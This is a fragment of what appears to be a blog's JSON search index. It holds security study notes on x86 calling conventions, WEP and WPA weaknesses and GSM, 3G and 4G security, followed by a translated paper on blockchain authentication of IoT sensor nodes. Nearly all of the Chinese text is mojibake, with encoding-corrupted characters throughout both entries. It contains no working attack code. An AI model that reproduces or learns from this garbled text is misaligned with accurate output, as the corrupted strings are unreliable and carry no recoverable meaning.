ˆ-&gt;ä½åœ°å€)3ã€æ ˆé¡¶espï¼šæ ˆçš„æœ€ä¸Šæ–¹ï¼ˆä½åœ°å€åŒºï¼‰ã€‚4ã€æ ˆä½ebpï¼šæ ˆçš„æœ€ä¸‹æ–¹ï¼ˆé«˜åœ°å€åŒºï¼‰ã€‚ +++ stdcall æ‰“å¼€è¢«è°ƒç”¨æ–¹ï¼š 12retn 10h //è¢«è°ƒç”¨æ–¹æ¸…æ ˆ(è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§)ï¼›retå…ˆè¿”å›åˆ°EIPï¼Œéšåï¼Œç›¸å½“äºadd esp,10hå‚æ•°å›ºå®š +++ fastcallè°ƒç”¨æ–¹ï¼š è¢«diao 123mov [ebp+var_C],edxmov [ebp+var_8],ecx//ä¿å­˜å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œé˜²æ­¢åè¾¹ç¨‹åºä½¿ç”¨å¯„å­˜å™¨è€Œæ”¹å˜å…¶å€¼ 1retn 8 //è¢«è°ƒç”¨æ–¹æ¸…æ ˆ(è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§)ï¼›retå…ˆè¿”å›åˆ°EIPï¼Œéšåï¼Œç›¸å½“äºadd esp,8 +++ thiscallå¯¹è±¡å­˜åœ¨äºå †ä¸Šï¼Œä¸åœ¨æ ˆé‡Œï¼› è°ƒç”¨æ–¹ï¼š ecxä¸­å­˜æ”¾å½“å‰è°ƒç”¨çš„å¯¹è±¡çš„æŒ‡é’ˆthisï¼› eaxé»˜è®¤å­˜æ”¾è¿”å›å€¼ï¼› è¢«è°ƒç”¨æ–¹ï¼š 123lea ecx,[ebp+var_4]//thisæŒ‡é’ˆè·å–retn 8 //è¢«è°ƒç”¨æ–¹æ¸…æ ˆ(è¢«è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§)ï¼›retå…ˆè¿”å›åˆ°EIPï¼Œéšåï¼Œç›¸å½“äºadd esp,8 +++ +++ 4ã€ç®€å•çš„è½¯ä»¶ä¿æŠ¤æŠ€æœ¯ä¸¾ä¾‹ +++ 5ã€Windowsçš„å†…æ ¸åŸç† +++ +++ å‘å±•è¿‡ç¨‹ä¸­çš„å˜åŒ–ï¼› +++ 1ã€ç§»åŠ¨ç½‘ç»œçš„åˆ†ç±»å’Œå®‰å…¨é£é™©åˆ†ç±»ï¼š æ— çº¿å±€åŸŸç½‘ï¼ˆWLANï¼‰ã€æ— çº¿ä¸ªåŸŸç½‘ï¼ˆWPANï¼‰ã€æ— çº¿ä½“åŸŸç½‘ï¼ˆWBANï¼‰ã€æ— çº¿åŸåŸŸç½‘ï¼ˆWMANï¼‰ã€æ— çº¿å¹¿åŸŸç½‘ï¼ˆWWANï¼‰ å®‰å…¨é£é™©ï¼š æœ‰çº¿ç½‘ç»œ æ— çº¿ç½‘ç»œ +++ 2ã€WLANå®‰å…¨æœºåˆ¶â€”-WEPï¼ŒIEEE 802.11i(WPAã€WPA2ã€CCMPã€TKIPã€è®¤è¯å¯†é’¥äº¤æ¢ã€å››æ­¥æ¡æ‰‹ç­‰)1ã€WEP +++ WEPçš„å®‰å…¨é—®é¢˜ï¼š RC4ç®—æ³•çš„ä½¿ç”¨ï¼ˆå­˜åœ¨å¤§é‡å¼±å¯†é’¥ï¼›æ¯256ä¸ªå¯†é’¥å°±æœ‰ä¸€ä¸ªï¼›å»ºè®®ï¼šæŠ›å¼ƒRC4è¾“å‡ºçš„å‰256æ¯”ç‰¹ï¼‰ â…£çš„ä½¿ç”¨ï¼ˆç©ºé—´å¤ªå°ï¼Œç”Ÿæ—¥æ”»å‡»ï¼‰ SKçš„äº§ç”Ÿä¸åˆ†å‘ï¼ˆæ— å¯†é’¥äº¤æ¢/ç®¡ç†æœºåˆ¶ï¼‰ CRC32ç®—æ³•çš„ä½¿ç”¨ï¼ˆCRC32æ˜¯çº¿æ€§çš„ï¼‰ æ— æŠ—é‡æ”¾æ”»å‡» +++ 2ã€IEEE 802.11i TSN(è¿‡åº¦å®‰å…¨ç½‘ç»œ) RSNï¼ˆåšå›ºå®‰å…¨ç½‘ç»œï¼‰ 3ã€WPA802.11iè‰æ¡ˆä¸­ä¸€éƒ¨åˆ†ï¼› 4ã€åŠ å¯†æœºåˆ¶TKIPâ€”ï¼ˆæš‚æ—¶å¯†é’¥å®Œæ•´æ€§åè®®ï¼‰ 5ã€åŠ å¯†æœºåˆ¶CCMPâ€”åŸºäºAESCCMPâ˜†â˜†â˜† +++ +++ +++ 3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨æœºåˆ¶â€”-GSMã€3Gã€4G1ã€GSM +++ GSMç³»ç»Ÿçš„å®‰å…¨ç›®æ ‡ï¼š ç”¨æˆ·èº«ä»½è®¤è¯ï¼šä¿è¯ç½‘ç»œä¸è¢«æœªæˆæƒè€…ä½¿ç”¨ æ•°æ®æœºå¯†æ€§ï¼š ç”¨æˆ·èº«ä»½ï¼ˆIMSIï¼‰ä¿å¯†ï¼š IMSIï¼ˆå›½é™…ç§»åŠ¨ç”¨æˆ·æ ‡è¯†ï¼‰ä¸è¢«æ³„éœ²ç»™æœªæˆæƒçš„ä¸ªäººã€å®ä½“æˆ–è¿‡ç¨‹ +++ GSMå®‰å…¨åˆ†æï¼š è®¤è¯ï¼šæŒ‘æˆ˜â€”-å“åº”ï¼Œé•¿æœŸå¯†é’¥æ²¡æœ‰æ³„éœ² åŠ å¯†ï¼šç©ºä¸­æ¥å£ï¼ˆå³ç”¨æˆ·åˆ°åŸºç«™éƒ¨åˆ†ï¼‰ åŒ¿åï¼šTMSI GSMçš„ä¸è¶³ï¼š è®¤è¯ï¼šå•å‘è®¤è¯ï¼Œä¸”ä¸‰å…ƒç»„å¯æ— é™æœŸä½¿ç”¨ åŠ å¯†ï¼šæ²¡æœ‰å®ç°ç«¯åˆ°ç«¯çš„åŠ å¯† å®Œæ•´æ€§ï¼šæ—  +++ 2ã€3Gâ˜†â˜†â˜†è®¤è¯å’Œå¯†é’¥åå•†è¿‡ç¨‹ +++ 3Gçš„å®‰å…¨ç›®æ ‡ï¼š å¯¹ç”¨æˆ·æ¨¡å—ï¼ˆUEï¼‰è¿›è¡Œè®¤è¯ï¼Œç‰¹åˆ«æ˜¯ç”¨æˆ·æœåŠ¡æ ‡è¯†æ¨¡å—ï¼ˆUSIMï¼‰ å‘UEå’ŒæœåŠ¡ç½‘ç»œSNæä¾›ä¼šè¯å¯†é’¥ åœ¨ä¼šè¯å¯†é’¥çš„ä¿æŠ¤ä¸‹åœ¨UEå’ŒSNä¹‹é—´å»ºç«‹å®‰å…¨è¿æ¥ 3Gçš„å±‚æ¬¡ï¼š åº”ç”¨å±‚ å½’å±/æœåŠ¡å±‚ ä¼ è¾“å±‚ +++ 3Gå®‰å…¨åŠŸèƒ½ç»“æ„ å¢å¼ºç”¨æˆ·èº«ä»½ä¿å¯†EUICï¼ˆ Enhanced User Identity Confidentialityï¼‰ï¼šé€šè¿‡å½’å±ç½‘å¯¹ç§»åŠ¨ç”¨æˆ·æ™ºèƒ½å¡èº«ä»½ä¿¡æ¯è¿›è¡Œè®¤è¯ ç”¨æˆ·èº«ä»½ä¿å¯†UICï¼ˆ User Identity Confidentialityï¼‰ è®¤è¯å’Œå¯†é’¥åå•†AKAï¼ˆ Authentication&amp; Key agreementï¼‰ï¼šç”¨äºUSIMå¡ã€VLRã€HLRé—´è¿›è¡ŒåŒå‘è®¤è¯å’Œå¯†é’¥åˆ†å‘ ç”¨æˆ·åŠä¿¡ä»¤æ•°æ®ä¿å¯†DCï¼šåŠ å¯†UEä¸RNCé—´ä¿¡æ¯ æ¶ˆæ¯è®¤è¯DIï¼šè®¤è¯æ¶ˆæ¯çš„å®Œæ•´æ€§ã€æ—¶æ•ˆä»¥åŠæ¶ˆæ¯çš„æ¥æºåœ°ä¸ç›®çš„åœ° +++ 3ã€4G 4Gç³»ç»Ÿçš„ç»„æˆï¼š ç§»åŠ¨ç»ˆç«¯ æ— çº¿æ¥å…¥ç½‘ æ— çº¿æ ¸å¿ƒç½‘ IPéª¨å¹²ç½‘ 4Gçš„å®‰å…¨å¨èƒ ç°æœ‰çš„æ— çº¿ç½‘ç»œå’ŒInternetçš„å®‰å…¨å¨èƒä¾ç„¶å­˜åœ¨ 4Gçš„ç»ˆç«¯ä¸å„ç§åº”ç”¨çš„äº¤äº’æ›´ä¸ºå¤æ‚ï¼Œå¨èƒä¹Ÿè¶Šå¤š","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"P2P networking based internet of things (IoT) sensor node authentication by Blockchain","slug":"P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)","date":"2020-05-29T10:20:08.000Z","updated":"2020-07-29T11:05:24.949Z","comments":true,"path":"2020/05/29/P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)/","link":"","permalink":"https://singlemindedt.github.io/2020/05/29/P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)/","excerpt":"","text":"P2P networking based internet of things (IoT) sensor node authentication by Blockchain(åŸºäºP2Pç½‘ç»œçš„ç‰©è”ç½‘ï¼ˆIoTï¼‰ä¼ æ„Ÿå™¨èŠ‚ç‚¹åŒºå—é“¾è®¤è¯)Abstractä¼ æ„Ÿå™¨èŠ‚ç‚¹åœ¨ç‰©è”ç½‘ç¯å¢ƒä¸­èµ·ç€é‡è¦ä½œç”¨ï¼Œæ¯ä¸ªä¼ æ„Ÿå™¨éƒ½æ˜¯å¯¹ç­‰ç½‘ç»œã€‚ç”±äºç‰©ç†å°ºå¯¸æœ‰é™ï¼Œç‰©è”ç½‘ ä¼ æ„Ÿå™¨èŠ‚ç‚¹å¿…é¡»å…·æœ‰è½»é‡è®¤è¯åè®®ã€‚ç‰©è”ç½‘ï¼ˆIoTï¼‰æ˜¯å„ç§æŠ€æœ¯çš„é›†åˆ å…ƒç´ ã€‚æœŸæœ›å¼‚æ„ç»ˆç«¯ï¼Œç½‘ç»œå’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„äº’é€šã€‚ä»–ä»¬ä¼šåŠ é€Ÿ é€šè¿‡ç‰©è”ç½‘å¹³å°çš„å¼€æ”¾ã€‚ç»“æœï¼Œç‰©è”ç½‘å°†å‡ºç°è®¸å¤šæŠ€æœ¯å’Œç®¡ç†å®‰å…¨å¨èƒ ç¯å¢ƒã€‚ä¼ æ„Ÿå™¨èŠ‚ç‚¹åè®®å¿…é¡»è½»å·§ä¸”å®‰å…¨ã€‚ç”±äºç‰©è”ç½‘è®¾å¤‡æœ‰å¤šç§ç”¨é€”ï¼Œå› æ­¤ éœ€è¦æ€§èƒ½çš„è®¾å¤‡ï¼Œå…·æœ‰å¯æ­£å¸¸å·¥ä½œçš„é«˜æ€§èƒ½èŠ¯ç‰‡ç»„çš„æ“ä½œç³»ç»Ÿï¼Œå¤§å¤šæ•°å¯†ç åè®®ã€‚ä½†æ˜¯ï¼Œè½¬ ç‚¹äº®/ç†„ç­IoTè®¾å¤‡æ‰§è¡Œç®€å•çš„ä»»åŠ¡ï¼Œä¾‹å¦‚åŸºäºä¸è¿è¡ŒOSçš„ä½æ€§èƒ½èŠ¯ç‰‡ç»„ã€‚å¦‚æœæœ‰ ä¸æ”¯æŒåŠ å¯†åè®®æˆ–è¯ä¹¦ï¼Œåˆ™å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå¹¶ä¸”æ€§èƒ½ä¸è¶³ä»¥å¤„ç†ã€‚å› æ­¤ï¼Œ æœ¬æ–‡æå‡ºäº†ä¸€ç§åŸºäºåŒºå—é“¾çš„ç‰©è”ç½‘è®¾å¤‡ï¼Œä»¥è·å–æ›´å®‰å…¨çš„èº«ä»½éªŒè¯æ–¹æ¡ˆã€‚ Keywordsï¼š P2P networking . Sensor network . Secure IoT . Node authentication . Light-weight protocol . Network security 1 Introductionç‰©è”ç½‘ï¼ˆIoTï¼‰æœåŠ¡å®¹æ˜“å—åˆ°å„ç§æ”»å‡» ç‰©è”ç½‘æŠ€æœ¯çš„æœ¬è´¨å¸¦æ¥çš„å®‰å…¨å¨èƒã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒå…·æœ‰æœ‰é™çš„ç¡¬ä»¶è§„æ ¼ï¼Œä¾‹å¦‚ä½åŠŸè€— æ¶ˆè€—ï¼Œå°‘é‡å†…å­˜ï¼Œä½å†…å­˜ç­‰ï¼Œ å¹¶ä¸”å¾€å¾€åˆ†å¸ƒåœ¨éš¾ä»¥ç®¡ç†çš„ç¯å¢ƒä¸­ï¼Œè¿™å¯èƒ½ä¼šå¸¦æ¥å„ç§å®‰å…¨å¨èƒ åŒ…æ‹¬ç‰©ç†æ”»å‡»çš„å› ç´ ã€‚è¿™äº›ç‰¹å¾å¯ä»¥ å¯¼è‡´ç‰©è”ç½‘æœåŠ¡å®‰å…¨è¿è¡Œä¸­çš„è‡´å‘½é”™è¯¯ å¹³å°æˆ–åŸºäºé”™è¯¯ä¿¡æ¯æä¾›æœåŠ¡ï¼Œ å¯¼è‡´ç‰©è”ç½‘æœåŠ¡å¹³å°å¤±å»å…¶åŠŸèƒ½[1]ã€‚ è¿‘å¹´æ¥ï¼Œé¢„è®¡äº’æ“ä½œæ€§ å¼‚æ„ç»ˆç«¯ï¼Œç½‘ç»œå’Œåº”ç”¨ç¨‹åºä¹‹é—´ å°†é€šè¿‡ç‰©è”ç½‘å¹³å°çš„å¼€æ”¾è€ŒåŠ é€Ÿï¼Œ å¯¼è‡´å„ç§æŠ€æœ¯å’Œè¡Œæ”¿å®‰å…¨ å¨èƒã€‚ç‰©è”ç½‘ç¯å¢ƒä¸­å¯èƒ½å‘ç”Ÿçš„å®‰å…¨å¨èƒ ç»§æ‰¿ç°æœ‰å¨èƒä¸­å¯èƒ½å‘ç”Ÿçš„å¨èƒ ICTï¼ˆä¿¡æ¯å’Œé€šä¿¡æŠ€æœ¯ï¼‰ç¯å¢ƒã€‚æœºå¯†æ€§ï¼Œå®Œæ•´æ€§å’Œå¯ç”¨æ€§ï¼ˆCIAï¼‰å¯ä»¥ é€šå¸¸è¢«è§†ä¸ºå¯¹åˆæ³•å•†å“çš„ä½¿ç”¨å’Œäº¤ä»˜çš„å¨èƒ æœåŠ¡ï¼Œé€šå¸¸è¢«ç§°ä¸ºCIAï¼Œè¿™ä¸‰ä¸ªä¸»è¦ ä¿¡æ¯å®‰å…¨çš„ç»„æˆéƒ¨åˆ†[2]ã€‚è¡¨1æ˜¾ç¤ºäº† ç‰©è”ç½‘æ¯ä¸ªç»„ä»¶ä¸­å¯èƒ½å‘ç”Ÿçš„å®‰å…¨å¨èƒ[3]ã€‚ å› æ­¤ï¼Œç‰©è”ç½‘è®¾å¤‡éœ€è¦ä¸€ç§è®¿é—®æ§åˆ¶æ–¹æ³•æ¥ä¿æŠ¤è®¾å¤‡å…å—å•ä¸ªç”¨æˆ·çš„å¹³å°å†…èº«ä»½éªŒè¯ä»¥åŠæœªç»æˆæƒçš„ç”¨æˆ·å¯¹è®¾å¤‡çš„ä»»æ„è®¿é—®ã€‚ å„ç§ç¯å¢ƒå’Œå„ç§ç‰©è”ç½‘çš„æœåŠ¡å¹³å° æœåŠ¡å¹³å°å’Œå¹³å°åº”ç”¨ç¨‹åºæœåŠ¡[4-6]ã€‚ å½“å‰ç‰©è”ç½‘ç¯å¢ƒä¸­å¯èƒ½å‘ç”Ÿçš„å®‰å…¨é—®é¢˜ [3]ã€‚ å·²ç»å¼€å‘å‡ºå„ç§è®¤è¯åè®®ï¼Œç›´åˆ° æœ€è¿‘ã€‚ ä½†æ˜¯ï¼Œå¤§å¤šæ•°æè®®çš„èº«ä»½éªŒè¯åè®®éƒ½ç”¨äºè·Ÿè¸ªä½ç½®è·Ÿè¸ªæ”»å‡»çš„ä½ç½®ã€‚ ä¸€ä¸ª é‡æ’­æ”»å‡»æˆ–æ¬ºéª—æ”»å‡»æ˜“å—æ¬ºéª—æ”»å‡» [3]ã€‚ è®¸å¤šç½‘ç«™éƒ½æœ‰å¼±ç‚¹å’Œä¾µçŠ¯éšç§çš„è¡Œä¸ºã€‚ ç ”ç©¶äººå‘˜ æ­£åœ¨å‘ç°å®ƒ[5]ã€‚ å› æ­¤ï¼Œè¿™é¡¹ç ”ç©¶å·¥ä½œæå‡ºäº† åŸºäºåŒºå—é“¾çš„å¯¹ç­‰èº«ä»½éªŒè¯æ–¹æ¡ˆ ä½¿ç”¨åŠ å¯†ç®—æ³•è¿›è¡Œé“¾æ¥å’Œä¿æŠ¤ã€‚ æ¯ä¸ªå— å…·æœ‰å“ˆå¸ŒæŒ‡é’ˆï¼Œé€šå¸¸ä½œä¸ºæŒ‡å‘å‰ä¸€ä¸ªçš„ç¬¦å·é“¾æ¥ å—ï¼Œæ—¶é—´æˆ³å’Œäº¤æ˜“æ•°æ®[11]ã€‚ æ ¹æ®è®¾è®¡ï¼Œ åŒºå—é“¾å›ºæœ‰åœ°æŠ—æ‹’æ›´æ”¹æ•°æ®ã€‚ ä»æŠ€æœ¯ä¸Šè®²ï¼ŒåŒºå—é“¾å¯ä»¥å……å½“â€œä¸€ä¸ªå¼€æ”¾çš„ï¼Œåˆ†å¸ƒå¼çš„åˆ†ç±»å¸ï¼Œå¯ä»¥é«˜æ•ˆï¼Œå¯éªŒè¯ä¸”æ°¸ä¹…åœ°è®°å½•åŒæ–¹ä¹‹é—´çš„äº¤æ˜“â€ã€‚ [12]ç”¨ä½œ åˆ†æ•£çš„åˆ†ç±»å¸ï¼Œä¼ ç»Ÿä¸Šï¼ŒåŒºå—é“¾ç”± å¯¹ç­‰ç½‘ç»œèŠ‚ç‚¹å…±åŒéµå®ˆåè®® ç”¨äºéªŒè¯æ–°å—ã€‚è®°å½•åï¼Œä»»ä½•ç»™å®šçš„æ•°æ® å¦‚æœæ²¡æœ‰å…¨éƒ¨æ›´æ”¹ï¼Œåˆ™æ— æ³•è¿½æº¯æ›´æ”¹å— éšåçš„å—å’Œç½‘ç»œå¤šæ•°çš„å†²çª[13]ã€‚ åŒºå—é“¾æ¯”éåŒºå—é“¾ç®—æ³•æ›´å®‰å…¨[26]ã€‚ ä½†æ˜¯ï¼Œéœ€è¦åœ¨æ€§èƒ½å’Œå®‰å…¨æ€§ä¹‹é—´è¿›è¡Œæƒè¡¡ã€‚ å¦‚æœå®‰å…¨äº¤æ˜“æ¯”æ•ˆç‡æ›´é‡è¦ï¼Œé‚£ä¹ˆ åŒºå—é“¾æ˜¯ç‰©è”ç½‘é€šä¿¡çš„æœ€ä½³è§£å†³æ–¹æ¡ˆã€‚ å…¶ä½™ç ”ç©¶ç»„ç»‡å¦‚ä¸‹ã€‚ç¬¬äºŒèŠ‚ è®¨è®ºæ— çº¿æ–¹é¢ä¸€äº›å½“å‰å­˜åœ¨çš„åè®® ä¼ æ„Ÿå™¨ç½‘ç»œï¼ˆWSNï¼‰ç¬¬3å’Œ4èŠ‚ä»‹ç»äº†è¯¦ç»†ä¿¡æ¯ æå‡ºçš„ç®—æ³•ã€‚ç¬¬5èŠ‚æè¿°äº†ç»“è®º å’Œæœªæ¥çš„å·¥ä½œã€‚ 2 Related work2.1 Wireless sensor networksWSNå¯ä»¥å¹¿æ³›åº”ç”¨äºå®æ—¶ç­‰é¢†åŸŸ äº¤é€šç›‘æ§ï¼Œå†›äº‹æ•°æ®æ”¶é›†ï¼Œåœ°éœ‡æ´»åŠ¨ åˆ†æ•£åº¦æµ‹é‡å’Œæ—¶é—´æ±¡æŸ“æµ‹é‡ã€‚ ç”±äºWSNç”±è¶…å°å‹ä¼ æ„Ÿå™¨ç»„æˆï¼Œå› æ­¤å­˜åœ¨ä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚å­˜å‚¨å†…å­˜ï¼Œè®¡ç®—é‡å’Œèƒ½é‡ é€šè®¯åŠå¾„ã€‚ æä¾›å®‰å…¨çš„æ— çº¿é€šä¿¡æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„é—®é¢˜ï¼Œå› ä¸ºä¼ æ„Ÿå™¨å¯èƒ½ä¼šæš´éœ²åœ¨æ¶åŠ£çš„ç¯å¢ƒä¸­ï¼Œå®¹æ˜“æ‹¦æˆªæ— çº¿ é€šè®¯ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥ç¯¡æ”¹ æ¶ˆæ¯æˆ–å°è¯•é‡ä¼ æ”»å‡»[10]ã€‚ å®‰å…¨çš„WSNé€šä¿¡çš„å„ä¸ªæ–¹é¢ ç ”ç©¶ã€‚ WSNéå¸¸å®¹æ˜“å—åˆ°ä¼ æ„Ÿå™¨èŠ‚ç‚¹ï¼ˆSNï¼‰çš„ç¡¬ä»¶è®¾å¤‡ä»¥åŠèŠ‚ç‚¹æ£€æµ‹ï¼ŒæŸåï¼Œçªƒå¬ï¼Œ æ‹’ç»æœåŠ¡æ”»å‡»å’Œè·¯ç”±æ”»å‡»ï¼ˆä¾‹å¦‚ï¼Œæ¼æ´å’Œè •è™«æ¼æ´ï¼‰å–å†³äºæ— çº¿ç½‘ç»œçš„ç‰¹å¾[1]ã€‚ ç”±äºä¼ æ„Ÿå™¨èŠ‚ç‚¹çš„æ€§è´¨æœ‰é™ï¼Œå› æ­¤ä¸å®¹æ˜“ åº”ç”¨ç°æœ‰çš„WSNå®‰å…¨æŠ€æœ¯ã€‚ å› æ­¤ï¼Œ æ­£åœ¨ç ”ç©¶åŠ æƒå¯†é’¥åˆ†å‘å’Œè®¤è¯æ–¹æ¡ˆï¼Œä»¥å®ç°æ¶ˆæ¯ç­‰å®‰å…¨å› ç´  å®Œæ•´æ€§ï¼Œæœºå¯†æ€§å’ŒèŠ‚ç‚¹èº«ä»½éªŒè¯ã€‚ åº”ç”¨è½»é‡çº§å…¬é’¥æœ‰ä¸¤ç§æ–¹æ³• å…·æœ‰å¤§é‡ç°æœ‰è®¡ç®—ä»¥é€‚åˆ ä¼ æ„Ÿå™¨èŠ‚ç‚¹å’ŒÎ¼-TESLAï¼ˆå®šæ—¶çš„â€œå¾®å‹â€ç‰ˆæœ¬ï¼Œ é«˜æ•ˆï¼Œæµå¼ï¼Œå®¹é”™è®¤è¯åè®®ï¼‰ å’ŒLEAPï¼ˆè½»é‡çº§å¯æ‰©å±•èº«ä»½éªŒè¯åè®®ï¼‰ ä½è®¡ç®—èƒ½åŠ›å’Œå®‰å…¨å¯†é’¥åˆ†å‘çš„SPINSï¼ˆå®‰å…¨ç½‘ç»œåŠ å¯†åè®®ï¼‰[24]è®¾è®¡ [22]ã€‚ PIKEï¼ˆå¯†é’¥å»ºç«‹åŒè¡Œæœºæ„ï¼‰[25]å…·æœ‰ æå‡ºäº†ä¸€ç§ç¡®ä¿ç½‘ç»œå®‰å…¨çš„å¯†é’¥åˆ†é…æ–¹æ¡ˆ åŸºäºå¯¹ç§°å¯†é’¥çš„å®‰å…¨æ€§åŸºäºå¯¹ç§°å¯†é’¥çš„å…¬å¼€ã€‚ å¦å¤–ï¼Œä¸éœ€è¦å¯†é’¥çš„åŸºäºIDçš„æ–¹æ¡ˆ åˆ†å¸ƒä»¥åŠåœ¨æ¶ˆæ¯ä¼ è¾“é¢‘ç‡ä¸Šå…·æœ‰ä¼˜åŠ¿çš„é—®é¢˜ä¹Ÿåœ¨ç ”ç©¶ä¸­ã€‚ ç”±äºæ— çº¿é€šä¿¡çš„æœ¬è´¨ï¼ŒWSNçš„ç¼ºç‚¹æ˜¯å®¹æ˜“çªƒå¬æ¶ˆæ¯[7]ã€‚ å› æ­¤ï¼Œä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µï¼Œæœ‰å¿…è¦é€šè¿‡åŠ å¯†å’Œäº¤æ¢æ•°æ®æ¥ç¡®ä¿æœºå¯†æ€§ã€‚ ä¸ºäº†ç”Ÿæˆè®¤è¯å¯†é’¥ï¼Œæ‰€æœ‰SNè¿›è¡Œé€šä¿¡ ç›´æ¥ä¸åŸºç«™ï¼ˆBSï¼‰ã€‚ å…¶å®å¾ˆéš¾ ä¸SNå’ŒBSç›´æ¥é€šä¿¡ã€‚ å¦‚æœèƒ½é‡æœ‰é™çš„èŠ‚ç‚¹å°è¯•é€šä¿¡ ç›´æ¥ä¸è¿œç¨‹BSè¿›è¡Œé€šä¿¡ï¼Œåˆ™èƒ½è€—ä¸º é€šè¿‡å‘é€å’Œæ¥æ”¶èº«ä»½éªŒè¯æ¶ˆæ¯è€Œå¢åŠ ã€‚ æ¶ˆè€—è¿™ç§èƒ½é‡çš„èŠ‚ç‚¹ä¸èƒ½ é•¿æœŸå‚ä¸äº¤æµ[10]ã€‚ 2.2 Light-weight sensor networks protocolsæœ‰ä¸€äº›åŸºäºè½»é‡çº§å…¬é’¥çš„åè®®ï¼Œå¹¶ä¸” å®ƒä»¬æ˜¯ç”±Î¼-TESLA[21]ï¼ŒLEAP [22]å’ŒSPINS [23]è®¾è®¡çš„ å…·æœ‰è¾ƒä½çš„è®¡ç®—èƒ½åŠ›å’Œå®‰å…¨çš„å¯†é’¥åˆ†å‘ã€‚ ä¼ æ„Ÿå™¨èŠ‚ç‚¹åœ¨ç‰©è”ç½‘ç¯å¢ƒä¸­èµ·ç€é‡è¦ä½œç”¨ã€‚ ä¼ æ„Ÿå™¨ èŠ‚ç‚¹æ˜¯ç‰©è”ç½‘çš„å…³é”®ã€‚ å› æ­¤ï¼Œè®¸å¤šç ”ç©¶äººå‘˜æ­£åœ¨ä¸“æ³¨äº ä¼ æ„Ÿå™¨èŠ‚ç‚¹çš„æ”»å‡»æ‰¿å—èƒ½åŠ›å’Œæœ‰æ•ˆçš„é€šä¿¡ åè®®ã€‚ ç‰©è”ç½‘å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œè¯¦ç»†ä¿¡æ¯å¦‚ä¸‹ã€‚ äº’è”ç½‘åŸºäºICTï¼ˆäº’è”ç½‘é€šä¿¡ï¼‰ æŠ€æœ¯ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§æ™ºèƒ½ç¯å¢ƒï¼Œå¯åœ¨ç”¨æˆ·ä¸å¯¹è±¡ä¹‹é—´ä»¥åŠå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´ä¼ é€’ä¿¡æ¯ é€šè¿‡è¿æ¥å·¥ä½œã€‚ ç¾å›½å¸‚åœºç ”ç©¶å…¬å¸Gartner é€‰æ‹©ç‰©è”ç½‘ä½œä¸ºæœ€å—å…³æ³¨çš„æŠ€æœ¯é¢†åŸŸ[8]ã€‚ ç‰©è”ç½‘æ˜¯ åˆ†ä¸ºä¸‰å¤§ç±»ï¼šè®¾å¤‡ï¼ˆç»ˆç«¯/ä¼ æ„Ÿå™¨ï¼‰ åŒºåŸŸï¼Œç½‘ç»œï¼ˆæœ‰çº¿/æ— çº¿ï¼‰åŒºåŸŸå’ŒæœåŠ¡æ¥å£ ï¼ˆå¹³å°/åº”ç”¨ç¨‹åºï¼‰åŒºåŸŸã€‚ è®¾å¤‡åŒºåŸŸä¼ è¾“æ•°æ® ä»ç‰¹å®šå¯¹è±¡æ”¶é›†å¹¶æå–åˆ°å¦ä¸€ä¸ªå¯¹è±¡ ä½¿ç”¨åµŒå…¥åœ¨å¯¹è±¡ä¸­çš„é€šä¿¡åŠŸèƒ½ã€‚ ç½‘ç»œåŒºåŸŸæ˜¯ä¸€ä¸ªæœ‰çº¿/æ— çº¿é€šé“ï¼Œç”¨äº ä¼ è¾“/æ¥æ”¶ç”¨æˆ·ä¸ å¯¹è±¡ï¼Œå¯¹è±¡åˆ°å¯¹è±¡ã€‚ æœåŠ¡æ¥å£åŒºåŸŸå¤„ç†æ•°æ®ä»¥ç”Ÿæˆä¿¡æ¯ï¼Œå¹¶æ§åˆ¶å’Œç®¡ç† å„ç§è®¾å¤‡ã€‚ 2.3 Vulnerability on IoTè™šå‡æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…ä¼ªè£…æˆ ä¼ æ„Ÿå™¨ç½‘ç»œä¸­çš„åˆæ³•æœåŠ¡å™¨ä»¥åŠå®¢æˆ·ç«¯ å‘å‡ºèº«ä»½éªŒè¯è¯·æ±‚ï¼Œç»§ç»­æ‰§è¡Œåè®®ï¼Œ éæ³•è·å–ä¼ æ„Ÿå™¨æˆ–ä¼ æ„Ÿå™¨çš„è®¤è¯å¯†é’¥ ç”¨æˆ·ã€‚é‡ä¼ æ”»å‡»æ˜¯æŒ‡åœ¨è®¤è¯è¿‡ç¨‹ä¸­ï¼Œå®ä½“ä¹‹é—´çš„è®¤è¯è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ç»„ä»¶ ä¼ æ„Ÿå™¨ç½‘ç»œå°†åœ¨åç»­çš„èº«ä»½éªŒè¯è¿‡ç¨‹ä¸­å­˜å‚¨å’Œé‡ç”¨[9]ã€‚ èº«ä»½éªŒè¯å¯†é’¥çŒœæµ‹æ”»å‡»æ˜¯å¯¹ æ”»å‡»è€…çªƒå¬æˆ–ä¼ªè£…ä¼ æ„Ÿå™¨ç½‘ç»œä¸­ç”¨æˆ·åˆ°ä¼ æ„Ÿå™¨ä¸ä¼ æ„Ÿå™¨åˆ°ä¼ 